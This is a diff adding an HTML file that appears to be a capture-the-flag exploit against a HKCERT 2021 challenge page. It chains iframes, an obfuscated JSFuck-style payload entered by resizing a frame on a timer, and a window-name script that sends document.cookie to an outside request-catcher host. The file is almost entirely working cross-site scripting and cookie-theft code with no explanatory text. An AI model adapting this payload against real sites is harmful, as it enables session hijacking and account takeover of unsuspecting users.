@@ -1,0 +1,44 @@
+<iframe src="" style="position: absolute;"></iframe>
+<iframe src="http://rotk-r52wwl.hkcert21.pwnable.hk/output.html#CS[+=]" id="poc" name='window.new_window=window.open("/");setTimeout(function(){window.new_window.location.href="javascript:location.href=`https://scjssrk.request.dreamhack.games/`+document.cookie"},1000)' style="position: absolute;"></iframe>
+<iframe src="http://rotk-r52wwl.hkcert21.pwnable.hk/cursor.html#CS[+=]" name="a" id="a"></iframe>
+<script>
+    const go1 = 'SSS[C]+[SS+[]][S][C]+[SS[CC[CCC]+CS[C]+SSS[C]+[[[]==C][S]+[]][S][CCC]+CC[CCC+C]+SC+SSS[S]+CC[CCC]+CC[CCC+C]+CS[C]+SC]+[]][S][CCC+CCC+CCC+C+C]+SSS[CCC]' // name
+    const go0 = '[C=+[]][S=C++]+[CCC=C+C+C]+[CS=[CSS+CSS][S]]+[SS=[+CSS][S]]+[SSS=[[][[]]+[]][+[]]]+[CC=[[]+[]][SSS[CCC+C]+SSS[CCC+C+C]+SSS[CCC+CCC]+SSS[C+C]]+[]]+[SC=[[C==C][S]+[]][S][C]]?!' + go1 + '???'
+    
+    // const go0 = '[C=+[]][S=C++]'
+    let cursor = 0
+    const tf = document.getElementById('a')
+    const table = {
+        // h, w (reversed)
+        'C': [105*3+35, 105+35],
+        'S': [105*6+35, 105*2+35],
+        '=': [105*7+35, 105*4+35],
+        '[': [105*5+35, 105*4+35],
+        ']': [105*9+35, 105*4+35],
+        '+': [105*12+35, 105*3+35],
+        '?': [105*8+35, 105*4+35], // eval
+        '!': [105*6+35, 105*4+35], // clear
+    }
+    var timer1;
+    flip = false;
+    tf.onload = () => {    
+        timer1 = setInterval(() => {
+            if (!flip) {
+                tf.width = table[go0[cursor]][0] + 'px'
+                tf.height = table[go0[cursor]][1] + 'px'
+
+                if (go0[cursor] == go0[cursor+1])
+                    flip = true;
+
+                cursor += 1;
+                if (cursor >= go0.length)
+                    clearInterval(timer1)
+            } else {
+                tf.width = '10px'
+                tf.height = '10px'
+                flip = false;
+            }
+
+        }, 40)
+    }
+</script>
